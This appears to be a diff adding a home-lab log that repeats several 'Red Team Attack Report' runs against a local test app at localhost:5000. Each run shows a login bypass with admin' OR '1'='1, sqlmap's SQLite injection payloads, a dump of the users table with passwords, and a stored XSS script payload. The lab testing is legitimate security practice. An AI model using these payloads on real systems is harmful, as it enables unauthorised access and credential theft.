+    Payload: username=admin' AND 3385=JSON_EXTRACT(CHAR(123,125),CHAR(113,122,113,113,113)||(SELECT (CASE WHEN (3385=3385) THEN 1 ELSE 0 END))||CHAR(113,122,113,107,113)) AND 'JiVg'='JiVg&password=test
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: username=admin' AND 8859=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'PzAs'='PzAs&password=test
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: username=-4742' UNION ALL SELECT NULL,CHAR(113,122,113,113,113)||CHAR(74,121,65,71,108,77,69,88,115,87,111,74,110,72,73,109,80,65,101,114,75,121,78,84,82,120,77,85,84,103,90,116,119,85,78,90,74,108,106,99)||CHAR(113,122,113,107,113),NULL-- OiVT&password=test
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[08:36:56] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[08:36:56] [INFO] fetching tables for database: 'SQLite_masterdb'
+[08:36:56] [INFO] fetching columns for table 'comments' 
+[08:36:56] [INFO] fetching entries for table 'comments'
+[08:36:56] [INFO] fetching number of entries for table 'comments' in database 'SQLite_masterdb'
+[08:36:56] [INFO] resumed: 0
+[08:36:56] [WARNING] table 'comments' in database 'SQLite_masterdb' appears to be empty
+Database: <current>
+Table: comments
+[0 entries]
++----+---------+
+| id | content |
++----+---------+
++----+---------+
+
+[08:36:56] [INFO] table 'SQLite_masterdb.comments' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/comments.csv'
+[08:36:56] [INFO] fetching columns for table 'users' 
+[08:36:56] [INFO] fetching entries for table 'users'
+Database: <current>
+Table: users
+[2 entries]
++----+-----------+----------+
+| id | password  | username |
++----+-----------+----------+
+| 1  | secret123 | admin    |
+| 2  | pass456   | alice    |
++----+-----------+----------+
+
+[08:36:56] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/users.csv'
+[08:36:56] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/results-09192026_0836am.csv'
+
+[*] ending @ 08:36:56 /2026-09-19/
+
+
+[4] 🎭 STORED XSS TEST
+✅ Stored XSS SUCCESSFUL!
+   Payload stored and reflected: <script>alert("XSS_PWNED")</script>
+
+================================================
+📋 SUMMARY
+================================================
+Target: http://localhost:5000
+Report: /home/kali/ai-red-blue-lab/logs/red_team_report.txt
+Completed: 2026-09-19T08:36:56Z
+================================================
+🔴 Red Team Attack Report - 2026-09-19T08:38:55Z
+================================================
+
+[1] 🔍 NMAP SCAN
+/usr/bin/nmap: 6: exec: /usr/lib/nmap/nmap: Operation not permitted
+
+[2] 💉 SQL INJECTION - Manual Test
+✅ SQL Injection SUCCESSFUL! Bypassed login!
+   Payload: admin' OR '1'='1
+Welcome admin!
+
+[3] 🤖 SQLMAP AUTO SCAN
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.10.8#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 08:38:55 /2026-09-19/
+
+[?1049h[22;0;0t[1;24r(B[m[4l[?7h[24;1H[?1049l[23;0;0t[?1l>[08:38:55] [WARNING] using '/home/kali/ai-red-blue-lab/logs/sqlmap' as the output directory
+[1/1] URL:
+GET http://localhost:5000/login
+POST data: username=admin&password=test
+do you want to test this URL? [Y/n/q]
+> Y
+[08:38:55] [INFO] testing URL 'http://localhost:5000/login'
+[08:38:55] [INFO] resuming back-end DBMS 'sqlite' 
+[08:38:55] [INFO] using '/home/kali/ai-red-blue-lab/logs/sqlmap/results-09192026_0838am.csv' as the CSV results file in multiple targets mode
+[08:38:55] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: SQLite AND boolean-based blind - WHERE or HAVING clause (JSON)
+    Payload: username=admin' AND CASE WHEN 3842=3842 THEN 3842 ELSE JSON(CHAR(111,100,116,79)) END AND 'zRxW'='zRxW&password=test
+
+    Type: error-based
+    Title: SQLite >= 3.9 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON path)
+    Payload: username=admin' AND 3385=JSON_EXTRACT(CHAR(123,125),CHAR(113,122,113,113,113)||(SELECT (CASE WHEN (3385=3385) THEN 1 ELSE 0 END))||CHAR(113,122,113,107,113)) AND 'JiVg'='JiVg&password=test
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: username=admin' AND 8859=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'PzAs'='PzAs&password=test
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: username=-4742' UNION ALL SELECT NULL,CHAR(113,122,113,113,113)||CHAR(74,121,65,71,108,77,69,88,115,87,111,74,110,72,73,109,80,65,101,114,75,121,78,84,82,120,77,85,84,103,90,116,119,85,78,90,74,108,106,99)||CHAR(113,122,113,107,113),NULL-- OiVT&password=test
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[08:38:55] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[08:38:55] [INFO] fetching tables for database: 'SQLite_masterdb'
+[08:38:55] [INFO] fetching columns for table 'comments' 
+[08:38:55] [INFO] fetching entries for table 'comments'
+[08:38:55] [INFO] fetching number of entries for table 'comments' in database 'SQLite_masterdb'
+[08:38:55] [INFO] resumed: 0
+[08:38:55] [WARNING] table 'comments' in database 'SQLite_masterdb' appears to be empty
+Database: <current>
+Table: comments
+[0 entries]
++----+---------+
+| id | content |
++----+---------+
++----+---------+
+
+[08:38:55] [INFO] table 'SQLite_masterdb.comments' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/comments.csv'
+[08:38:55] [INFO] fetching columns for table 'users' 
+[08:38:55] [INFO] fetching entries for table 'users'
+Database: <current>
+Table: users
+[2 entries]
++----+-----------+----------+
+| id | password  | username |
++----+-----------+----------+
+| 1  | secret123 | admin    |
+| 2  | pass456   | alice    |
++----+-----------+----------+
+
+[08:38:55] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/users.csv'
+[08:38:55] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/results-09192026_0838am.csv'
+
+[*] ending @ 08:38:55 /2026-09-19/
+
+
+[4] 🎭 STORED XSS TEST
+✅ Stored XSS SUCCESSFUL!
+   Payload stored and reflected: <script>alert("XSS_PWNED")</script>
+
+================================================
+📋 SUMMARY
+================================================
+Target: http://localhost:5000
+Report: /home/kali/ai-red-blue-lab/logs/red_team_report.txt
+Completed: 2026-09-19T08:38:55Z
+================================================
+🔴 Red Team Attack Report - 2026-09-19T08:44:16Z
+================================================
+
+[1] 🔍 NMAP SCAN
+/usr/bin/nmap: 6: exec: /usr/lib/nmap/nmap: Operation not permitted
+
+[2] 💉 SQL INJECTION - Manual Test
+✅ SQL Injection SUCCESSFUL! Bypassed login!
+   Payload: admin' OR '1'='1
+Welcome admin!
+
+[3] 🤖 SQLMAP AUTO SCAN
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.10.8#stable}
+|_ -| . [,]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 08:44:16 /2026-09-19/
+
+[?1049h[22;0;0t[1;24r(B[m[4l[?7h[24;1H[?1049l[23;0;0t[?1l>[08:44:16] [WARNING] using '/home/kali/ai-red-blue-lab/logs/sqlmap' as the output directory
+[1/1] URL:
+GET http://localhost:5000/login
+POST data: username=admin&password=test
+do you want to test this URL? [Y/n/q]
+> Y
+[08:44:16] [INFO] testing URL 'http://localhost:5000/login'
+[08:44:16] [INFO] resuming back-end DBMS 'sqlite' 
+[08:44:16] [INFO] using '/home/kali/ai-red-blue-lab/logs/sqlmap/results-09192026_0844am.csv' as the CSV results file in multiple targets mode
+[08:44:16] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: SQLite AND boolean-based blind - WHERE or HAVING clause (JSON)
+    Payload: username=admin' AND CASE WHEN 3842=3842 THEN 3842 ELSE JSON(CHAR(111,100,116,79)) END AND 'zRxW'='zRxW&password=test
+
+    Type: error-based
+    Title: SQLite >= 3.9 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON path)
+    Payload: username=admin' AND 3385=JSON_EXTRACT(CHAR(123,125),CHAR(113,122,113,113,113)||(SELECT (CASE WHEN (3385=3385) THEN 1 ELSE 0 END))||CHAR(113,122,113,107,113)) AND 'JiVg'='JiVg&password=test
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: username=admin' AND 8859=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'PzAs'='PzAs&password=test
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: username=-4742' UNION ALL SELECT NULL,CHAR(113,122,113,113,113)||CHAR(74,121,65,71,108,77,69,88,115,87,111,74,110,72,73,109,80,65,101,114,75,121,78,84,82,120,77,85,84,103,90,116,119,85,78,90,74,108,106,99)||CHAR(113,122,113,107,113),NULL-- OiVT&password=test
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[08:44:16] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[08:44:16] [INFO] fetching tables for database: 'SQLite_masterdb'
+[08:44:16] [INFO] fetching columns for table 'users' 
+[08:44:16] [INFO] fetching entries for table 'users'
+Database: <current>
+Table: users
+[2 entries]
++----+-----------+----------+
+| id | password  | username |
++----+-----------+----------+
+| 1  | secret123 | admin    |
+| 2  | pass456   | alice    |
++----+-----------+----------+
+
+[08:44:16] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/users.csv'
+[08:44:16] [INFO] fetching columns for table 'comments' 
+[08:44:16] [INFO] fetching entries for table 'comments'
+[08:44:16] [INFO] fetching number of entries for table 'comments' in database 'SQLite_masterdb'
+[08:44:16] [INFO] resumed: 0
+[08:44:16] [WARNING] table 'comments' in database 'SQLite_masterdb' appears to be empty
+Database: <current>
+Table: comments
+[0 entries]
++----+---------+
+| id | content |
++----+---------+
++----+---------+
+
+[08:44:16] [INFO] table 'SQLite_masterdb.comments' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/comments.csv'
+[08:44:16] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/results-09192026_0844am.csv'
+
+[*] ending @ 08:44:16 /2026-09-19/
+
+
+[4] 🎭 STORED XSS TEST
+✅ Stored XSS SUCCESSFUL!
+   Payload stored and reflected: <script>alert("XSS_PWNED")</script>
+
+================================================
+📋 SUMMARY
+================================================
+Target: http://localhost:5000
+Report: /home/kali/ai-red-blue-lab/logs/red_team_report.txt
+Completed: 2026-09-19T08:44:17Z
+================================================
+🔴 Red Team Attack Report - 2026-09-19T08:46:12Z
+================================================
+
+[1] 🔍 NMAP SCAN
+/usr/bin/nmap: 6: exec: /usr/lib/nmap/nmap: Operation not permitted
+
+[2] 💉 SQL INJECTION - Manual Test
+✅ SQL Injection SUCCESSFUL! Bypassed login!
+   Payload: admin' OR '1'='1
+Welcome admin!
+
+[3] 🤖 SQLMAP AUTO SCAN
+        ___
+       __H__
+ ___ ___[)]_____ ___ ___  {1.10.8#stable}
+|_ -| . [(]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 08:46:12 /2026-09-19/
+
+[?1049h[22;0;0t[1;24r(B[m[4l[?7h[24;1H[?1049l[23;0;0t[?1l>[08:46:12] [WARNING] using '/home/kali/ai-red-blue-lab/logs/sqlmap' as the output directory
+[1/1] URL:
+GET http://localhost:5000/login
+POST data: username=admin&password=test
+do you want to test this URL? [Y/n/q]
+> Y
+[08:46:12] [INFO] testing URL 'http://localhost:5000/login'
+[08:46:12] [INFO] resuming back-end DBMS 'sqlite' 
+[08:46:12] [INFO] using '/home/kali/ai-red-blue-lab/logs/sqlmap/results-09192026_0846am.csv' as the CSV results file in multiple targets mode
+[08:46:12] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: boolean-based blind
+    Title: SQLite AND boolean-based blind - WHERE or HAVING clause (JSON)
+    Payload: username=admin' AND CASE WHEN 3842=3842 THEN 3842 ELSE JSON(CHAR(111,100,116,79)) END AND 'zRxW'='zRxW&password=test
+
+    Type: error-based
+    Title: SQLite >= 3.9 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON path)
+    Payload: username=admin' AND 3385=JSON_EXTRACT(CHAR(123,125),CHAR(113,122,113,113,113)||(SELECT (CASE WHEN (3385=3385) THEN 1 ELSE 0 END))||CHAR(113,122,113,107,113)) AND 'JiVg'='JiVg&password=test
+
+    Type: time-based blind
+    Title: SQLite > 2.0 AND time-based blind (heavy query)
+    Payload: username=admin' AND 8859=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))) AND 'PzAs'='PzAs&password=test
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 3 columns
+    Payload: username=-4742' UNION ALL SELECT NULL,CHAR(113,122,113,113,113)||CHAR(74,121,65,71,108,77,69,88,115,87,111,74,110,72,73,109,80,65,101,114,75,121,78,84,82,120,77,85,84,103,90,116,119,85,78,90,74,108,106,99)||CHAR(113,122,113,107,113),NULL-- OiVT&password=test
+---
+do you want to exploit this SQL injection? [Y/n] Y
+[08:46:12] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[08:46:12] [INFO] fetching tables for database: 'SQLite_masterdb'
+[08:46:12] [INFO] fetching columns for table 'comments' 
+[08:46:12] [INFO] fetching entries for table 'comments'
+[08:46:12] [INFO] fetching number of entries for table 'comments' in database 'SQLite_masterdb'
+[08:46:12] [INFO] resumed: 0
+[08:46:12] [WARNING] table 'comments' in database 'SQLite_masterdb' appears to be empty
+Database: <current>
+Table: comments
+[0 entries]
++----+---------+
+| id | content |
++----+---------+
++----+---------+
+
+[08:46:12] [INFO] table 'SQLite_masterdb.comments' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/comments.csv'
+[08:46:12] [INFO] fetching columns for table 'users' 
+[08:46:12] [INFO] fetching entries for table 'users'
+Database: <current>
+Table: users
+[2 entries]
++----+-----------+----------+
+| id | password  | username |
++----+-----------+----------+
+| 1  | secret123 | admin    |
+| 2  | pass456   | alice    |
++----+-----------+----------+
+
+[08:46:12] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/localhost/dump/SQLite_masterdb/users.csv'
+[08:46:12] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/kali/ai-red-blue-lab/logs/sqlmap/results-09192026_0846am.csv'
+
+[*] ending @ 08:46:12 /2026-09-19/
+
+
+[4] 🎭 STORED XSS TEST
+✅ Stored XSS SUCCESSFUL!
+   Payload stored and reflected: <script>alert("XSS_PWNED")</script>
+
+================================================
+📋 SUMMARY
+================================================
+Target: http://localhost:5000
+Report: /home/kali/ai-red-blue-lab/logs/red_team_report.txt
+Completed: 2026-09-19T08:46:12Z
